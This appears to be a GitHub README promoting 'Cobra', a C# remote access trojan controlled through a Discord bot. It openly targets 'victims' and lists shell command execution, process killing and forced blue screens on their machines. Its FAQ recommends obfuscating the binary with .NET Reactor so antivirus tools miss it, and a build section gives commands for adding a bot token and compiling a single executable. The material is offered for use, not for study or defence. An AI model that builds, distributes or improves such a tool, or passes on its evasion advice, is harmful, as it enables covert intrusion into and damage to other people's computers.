# Cobra

Cobra is a C# Remote Access Tool, made due to the lack of good Remote Access Tools that do not need port forwarding, (and the ones that do exist, sort of suck)
     
As such, the easiest way to do this is using a Discord Bot. Other products just as [Pysillion](https://github.com/mategol/PySilon-malware)

  However, due to it being written in Python, it's awfully slow, and if there are multiple people trying to control it, it will often crack and fail to restart itself. 
  
  Due to Cobra being written in C#, it's fast and doesn't have this issue. Plus, as it's a compiled language, your victim **does not need any interpreters installed, and the detections from using a Python compiler are avoided**

### Please note ***This program is in beta, it was made as a PoC, some features are broken. If we get to 20 stars, we will fix what's broken.***
## Features

- Able To Execute Shell Commands On The Target's Machine
- Able to Get Process Info on Target's Machine
- Able to Kill Processes on Target's Machine
- Able to Cause A BSOD (Blue Screen of Death) On Target's Machine (Good for privesc)
- Able to Change Target's Mouse Position to the Provided Screen
- Coordinates
- Able To Pop Up A Message Box With The Specified Caption And Title


## FAQ

#### Why is this "faster" just because it's written in C#?

Because C# is just faster! No, seriously, C# is a compiled language, making it more efficient than interpreted languages like Python.

#### My binary is detected! How can I reduce this?

Obfuscation! Not only does it prevent your bot token being ripped out, it prevents you geting flagged! A program I reccomend is .NETReactor, it can make almost anything FUD, plus it also trims down your file size (sometimes)

## Building

To build this, you can use the **build.bat** script 
If you want to do this manually, you can

```bash
  git clone https://github.com/0xSerpent/Cobra
  cd Cobra-main # If you're already in the directory, skip this
  echo YOURTOKENHERE > token.txt
  # You have two options here
  #you either compile it as a single executable (more sus, but easier to  share), 
  # or you can compile it as multiple
  
  # Option One.
  dotnet publish -r win10-x64 -c Release /p:PublishSingleFile=true /p:PublishTrimmed=true
  # Option two
  dotnet build

  # Output file in in /bin
```



## Contributing

We are always open to contributions.

See `contributing.md` to contribute.

Please adhere to this project's `license`. 

Even if you're not gonna adhere to it, please don't be a skid and put your own name on it without changing anything!


## Authors

- [@0x-Stealth](https://www.github.com/0x-Stealth)
- [@m21acro](https://github.com/m21acro)
